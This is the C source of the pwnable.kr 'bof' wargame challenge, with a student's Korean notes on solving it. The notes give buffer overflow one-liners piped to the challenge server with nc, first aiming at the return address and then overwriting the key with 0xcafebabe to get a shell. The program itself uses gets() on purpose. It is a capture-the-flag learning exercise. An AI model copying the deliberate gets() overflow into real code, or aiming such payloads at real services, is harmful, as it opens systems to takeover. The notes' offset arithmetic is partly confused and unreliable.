#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/********************************************************************************************//*

	명령어는 드림핵에 있는 솔루션 명령어랑 비슷하게 만들었음.

	목표: system("/bin/sh")를 실행하여 flag를 읽어들이기

	참고 사이트: 
		1. https://isc9511.tistory.com/119 공격기법(Buffer Overflow, bof)
		2. https://qzqz.tistory.com/367 보호기법(Stack Overflow)
	0x56555664 : call system("/bin/sh")의 주소
	buf[32] + SFP(Stack Frame Pointer, 4byte) + retAddr(jne(if)를 피하고 바로 call system으로!)
	(for i in {1..36}; do echo -n "A"; done; printf "%x\n" 0x56555664) | nc pwnable.kr 9000
	A로 buffer와 SFP를 채운 값과 4byte의 return address에 디버깅을 통해 얻은 system 함수를 호출하는 
	주소 0x56555664로 이동하는 값을 인자로 nc pwnable.kr 9000에 실행되고 있는 프로세스 bof에 삽입

	예상했던 결과: 위 명령어로 버퍼 오버플로우가 발생해 ret addr가 실행되어 call system을 통해 shell을 얻어낸다.
	결과: *** stack smashing detected ***: /home/bof/bof terminated --> 스택 오버플로우 발생

	--> 새로운 방법: key 값을 변조하여 조건문 충족시키기

	Function: 0x5655569a func
	Function - gets: 0x5655564f
	Parameters: 0xffffd6d0 --> 0x00000000deadbeef
	이걸 변조하면 되지 않을까? 어떻게 변조를 해야하나? 리턴 주소만 바꿀 수 있다고 아는데,,

	(for i in {1..36}; do echo -n "A"; done; printf "\xbe\xba\xfe\xca"; cat) | nc pwnable.kr 9000

	// 0x5655569a - 0x5655564f(call gets) = 4b(75)
	// 0x5655569a - 0x56555654(cmp key == 0xcafebabe) = 46(69)

	// 1byte = 8bit
	// 4bit = 1hex
	// 1byte = 2hex
	// A(1byte)
	// 69 / 2(A) = 34
*//********************************************************************************************/

void func(int key) {
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
